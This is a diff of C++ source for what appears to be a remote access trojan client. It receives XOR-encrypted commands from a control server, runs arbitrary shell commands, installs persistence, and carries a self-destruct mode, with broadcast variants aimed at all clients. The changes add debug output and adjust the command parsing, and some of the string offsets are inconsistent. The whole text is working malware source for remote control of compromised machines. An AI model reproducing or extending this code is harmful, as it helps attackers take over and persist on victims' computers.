@@ -66,7 +66,12 @@ int Connexion::main()
         //Sleep(1000);
         //cout << "in main...." << endl;
         command = recvSafe(); //Recv safe and decrypt xor
-
+        cout << command << endl;
+        cout << "len: " << command.length() << endl;
+        if(command.length() >= 15)
+        {
+            cout << "--->" << command.substr(0,15) << endl;
+        }
         if(command.find("is_life?") != string::npos)
         {
             ;
@@ -118,28 +123,33 @@ int Connexion::main()
             }
             else if(command.substr(0,8)=="MOD_ALL:")
             {
-                Exec().executeCommand(command.substr(8,command.length()));
+                cout << "Mod all" << endl;
+                Exec().executeCommand(command.substr(8));
                 
             }
-            else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")   //A CHANGER !!!!!!
+            else if (command.substr(0,16) =="MOD_PERSISTENCE:")   //A CHANGER !!!!!!
             {
                 cout << "IN mod persi " << endl;
                 //In mod persistence.
                 Persistence persistence(a_is_admin, a_path_prog);
+                persistence.main();
 
-                if(command.substr(23,command.length()) =="default") //The client sends a response to the server to report whether the persistence was successfully completed. 
+                if(command.substr(16) =="default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
-                    //cout << "Default persi" << endl;
-                    persistence.main();
+                    cout << "Default persi" << endl;
+                    send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);    
                 }
-                int satt = send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);
+                else
+                {
+                    cout << "broadcast persi" << endl;
+                }
             }
             
-            else if (command.substr(0, 15)  == "MOD_DESTRUCTION:")
+            else if (command.substr(0,16) == "MOD_DESTRUCTION:") 
             {
                 cout << "MOD DESTRUCTION !" << endl;
 
-                if(totalDestruction(a_path_prog) == 0)
+                if(totalDestruction() == 0)
                 {
                     //If error
                     status = "[+] The destruction mode is executed successfully.";
@@ -147,16 +157,27 @@ int Connexion::main()
                 else
                 {
                     status = "[-] An error occurred while executing the destroy mode.";
-                }
+                }  
 
-                send(sock_client, status.c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
-                cout << "send status" << endl;
-                cout << "bye... " << endl;
-                Sleep(2000);
-                closeConnexion();
-                exit(0);
+                if(command.substr(15,6) == "default") //6 for default
+                {
+                    //if default then send status at server.
+                    cout << "persi default" << endl;
+                    send(sock_client, status.c_str(), status.length(),0); //Send the statue to the server. The server will just display the status.
+                    cout << "send status" << endl;
+                }
                 
+                else //else  substr(15,6) == "broadcast"
+                {
+                    cout << "BROADCAST DESTRUCTION !!!!" << endl;
+                }
+                cout << status << endl;
+                cout << "bye... " << endl;
+                system("pause");
+                closeConnexion();
+                exit(0);    
             }
+
             else
             {
                 result = Exec().executeCommand(command);
